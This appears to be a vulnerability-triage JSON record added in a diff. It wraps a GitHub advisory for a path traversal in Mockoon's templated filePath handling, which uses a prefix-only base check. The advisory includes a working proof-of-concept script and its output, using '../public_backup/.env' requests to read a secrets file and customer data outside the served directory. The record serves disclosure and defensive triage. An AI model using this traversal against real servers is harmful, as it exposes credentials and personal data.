@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/205160219?v=4\", \"events_url\": \"https://api.github.com/users/miauzxw/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/miauzxw/followers\", \"following_url\": \"https://api.github.com/users/miauzxw/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/miauzxw/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/miauzxw\", \"id\": 205160219, \"login\": \"miauzxw\", \"node_id\": \"U_kgDODDp_Gw\", \"organizations_url\": \"https://api.github.com/users/miauzxw/orgs\", \"received_events_url\": \"https://api.github.com/users/miauzxw/received_events\", \"repos_url\": \"https://api.github.com/users/miauzxw/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/miauzxw/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/miauzxw/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/miauzxw\", \"user_view_type\": \"public\"}}, {\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/2404584?v=4\", \"events_url\": \"https://api.github.com/users/geo-chen/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/geo-chen/followers\", \"following_url\": \"https://api.github.com/users/geo-chen/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/geo-chen/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/geo-chen\", \"id\": 2404584, \"login\": \"geo-chen\", \"node_id\": \"MDQ6VXNlcjI0MDQ1ODQ=\", \"organizations_url\": \"https://api.github.com/users/geo-chen/orgs\", \"received_events_url\": \"https://api.github.com/users/geo-chen/received_events\", \"repos_url\": \"https://api.github.com/users/geo-chen/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/geo-chen/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/geo-chen/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/geo-chen\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-59149\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-23\", \"name\": \"Relative Path Traversal\"}], \"description\": \"## Summary\\n\\nA `FILE` response whose `filePath` embeds request data (e.g. `\\\"/srv/public/{{queryParam 'name'}}\\\"`, the documented way to let the client pick a file) is confined by `getSafeFilePath` with `resolvedPath.startsWith(staticBaseDir)`. That prefix test has no path-separator boundary, so a `../`-escaped path whose absolute form string-prefixes the base directory passes. An unauthenticated client reads files from sibling paths outside the served directory.\\n\\n## Details\\n\\n`packages/commons-server/src/libs/server/server.ts`, `getSafeFilePath` (line 2315). The static base is the text before the first `{{`, resolved to an absolute path; the parsed `filePath` is then bounded by a string-prefix check:\\n\\n```ts\\nconst staticBaseDir = staticBaseMatch ? resolve(staticBaseMatch[1]) : null;     // 2336\\nconst parsedFilePath = TemplateParser({ ... request ... });                     // request-controlled\\nconst resolvedPath = resolvePath(parsedFilePath);\\n\\nif (isPathAbsolute) {\\n  if (!staticBaseDir || !resolvedPath.startsWith(staticBaseDir)) {              // 2355\\n    throw new Error(`Access to absolute path outside of the original static base directory (${resolvedPath})`);\\n  }\\n} else if (!resolvedPath.startsWith(this.options.environmentDirectory)) {       // 2362\\n  throw new Error(`Access to relative path outside of the environment base directory (${resolvedPath})`);\\n}\\n```\\n\\nWith `\\\"/srv/public/{{queryParam 'name'}}\\\"`, `staticBaseDir = /srv/public`. A request `name=../public_backup/.env` resolves to `/srv/public_backup/.env`, and `\\\"/srv/public_backup/.env\\\".startsWith(\\\"/srv/public\\\")` is `true` → served. Any sibling whose absolute path begins with the string `/srv/public` is reachable; the relative branch (`:2362`) is the same against `environmentDirectory`. A correct check appends `sep` to the base, or rejects when `relative(base, resolvedPath)` starts with `..`.\\n\\n`filePath` is request-controlled (`queryParam`/`urlParam`/header/body via `TemplateParser`) for every `FILE` response: HTTP `sendFile` (`:1762`), WebSocket (`:1145`), callbacks (`:1586`).\\n\\n## PoC\\n\\n```sh\\ncat > /tmp/poc.sh <<'POC'\\nset -e\\nmkdir -p /work/public /work/public_backup && cd /work\\necho 'public landing page' > public/index.txt\\necho 'AWS_SECRET_ACCESS_KEY=redacted' > public_backup/.env\\necho 'Michael, michael@example.com, 555-22-7741' > public_backup/customers.csv\\ncat > env.json <<'JSON'\\n{\\\"uuid\\\":\\\"00000000-0000-0000-0000-000000000001\\\",\\\"lastMigration\\\":33,\\\"name\\\":\\\"f\\\",\\\"port\\\":3000,\\\"hostname\\\":\\\"\\\",\\\"folders\\\":[],\\n\\\"routes\\\":[{\\\"uuid\\\":\\\"11111111-0000-0000-0000-000000000001\\\",\\\"type\\\":\\\"http\\\",\\\"documentation\\\":\\\"\\\",\\\"method\\\":\\\"get\\\",\\\"endpoint\\\":\\\"download\\\",\\n\\\"responses\\\":[{\\\"uuid\\\":\\\"22222222-0000-0000-0000-000000000001\\\",\\\"body\\\":\\\"\\\",\\\"latency\\\":0,\\\"statusCode\\\":200,\\\"label\\\":\\\"\\\",\\\"headers\\\":[],\\n\\\"bodyType\\\":\\\"FILE\\\",\\\"filePath\\\":\\\"/work/public/{{queryParam 'name'}}\\\",\\\"sendFileAsBody\\\":true,\\\"rules\\\":[],\\\"rulesOperator\\\":\\\"OR\\\",\\n\\\"disableTemplating\\\":false,\\\"fallbackTo404\\\":false,\\\"default\\\":true,\\\"crudKey\\\":\\\"id\\\",\\\"callbacks\\\":[]}],\\n\\\"responseMode\\\":null,\\\"streamingMode\\\":null,\\\"streamingInterval\\\":0}],\\n\\\"rootChildren\\\":[{\\\"type\\\":\\\"route\\\",\\\"uuid\\\":\\\"11111111-0000-0000-0000-000000000001\\\"}],\\n\\\"proxyMode\\\":false,\\\"proxyHost\\\":\\\"\\\",\\\"proxyRemovePrefix\\\":false,\\n\\\"tlsOptions\\\":{\\\"enabled\\\":false,\\\"type\\\":\\\"CERT\\\",\\\"pfxPath\\\":\\\"\\\",\\\"certPath\\\":\\\"\\\",\\\"keyPath\\\":\\\"\\\",\\\"caPath\\\":\\\"\\\",\\\"passphrase\\\":\\\"\\\"},\\n\\\"cors\\\":true,\\\"headers\\\":[],\\\"proxyReqHeaders\\\":[],\\\"proxyResHeaders\\\":[],\\\"data\\\":[]}\\nJSON\\nnpm i -g @mockoon/cli@9.6.1 >/dev/null 2>&1\\nmockoon-cli start --data env.json --port 3000 >/tmp/srv.log 2>&1 &\\nsleep 6\\nnode -e '\\nconst UA={headers:{\\\"User-Agent\\\":\\\"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\\\"}};\\nconst g=async(q)=>{const r=await fetch(\\\"http://127.0.0.1:3000/download?name=\\\"+encodeURIComponent(q),UA);return (await r.text()).trim();};\\n(async()=>{\\n console.log(\\\"[*] intended file (public/index.txt)    :\\\",await g(\\\"index.txt\\\"));\\n console.log(\\\"[+] escape -> ../public_backup/.env     :\\\",await g(\\\"../public_backup/.env\\\"));\\n console.log(\\\"[+] escape -> ../public_backup/customers:\\\",await g(\\\"../public_backup/customers.csv\\\"));\\n})();'\\nPOC\\ndocker run --rm -v /tmp/poc.sh:/poc.sh:ro node:20-bookworm-slim bash /poc.sh\\n```\\n\\nOutput:\\n\\n```text\\n[*] intended file (public/index.txt)    : public landing page\\n[+] escape -> ../public_backup/.env     : AWS_SECRET_ACCESS_KEY=redacted\\n[+] escape -> ../public_backup/customers: Michael, michael@example.com, 555-22-7741\\n```\\n\\n`../public_backup/.env` and `../public_backup/customers.csv` are served, outside `/work/public/`, because their absolute paths string-prefix `/work/public`\", \"epss\": {\"percentage\": 0.00483, \"percentile\": 0.39546}, \"ghsa_id\": \"GHSA-8wqc-v2q8-vff2\", \"github_reviewed_at\": \"2026-09-11T22:04:32Z\", \"html_url\": \"https://github.com/advisories/GHSA-8wqc-v2q8-vff2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8wqc-v2q8-vff2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-59149\"}], \"nvd_published_at\": \"2026-07-09T19:17:07Z\", \"published_at\": \"2026-09-11T22:04:32Z\", \"references\": [\"https://github.com/mockoon/mockoon/security/advisories/GHSA-8wqc-v2q8-vff2\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-59149\", \"https://github.com/mockoon/mockoon/pull/2255\", \"https://github.com/mockoon/mockoon/commit/b42bdfb7f82e83f0e81bea8e6fe41adf5ec82585\", \"https://github.com/mockoon/mockoon/releases/tag/v9.7.0\", \"https://mockoon.com/releases/9.7.0\", \"https://github.com/advisories/GHSA-8wqc-v2q8-vff2\"], \"repository_advisory_url\": \"https://api.github.com/repos/mockoon/mockoon/security-advisories/GHSA-8wqc-v2q8-vff2\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/mockoon/mockoon\", \"summary\": \"@Mockoon/commons-server: Path traversal in templated `filePath` lets a request escape the served directory (prefix-only base check)\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-11T22:04:34Z\", \"url\": \"https://api.github.com/advisories/GHSA-8wqc-v2q8-vff2\", \"vulnerabilities\": [{\"first_patched_version\": \"9.7.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@mockoon/commons-server\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 9.6.1\"}, {\"first_patched_version\": \"9.7.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@mockoon/cli\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 9.6.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8wqc-v2q8-vff2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@mockoon/cli: <= 9.6.1",
+      "@mockoon/commons-server: <= 9.6.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-59149"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@mockoon/cli",
+      "@mockoon/commons-server"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-09-12T19:11:33.334786Z",
+  "provenance": {
+    "content_sha256": "1721200ea060e504b488d6295f70687fcbf86749dcf88df31adac78caf4fe4e4",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-11T22:04:32Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8wqc-v2q8-vff2",
+  "status": "active",
+  "title": "@Mockoon/commons-server: Path traversal in templated `filePath` lets a request escape the served directory (prefix-only base check)",
+  "updated_at": "2026-09-11T22:04:34Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8wqc-v2q8-vff2"
+}
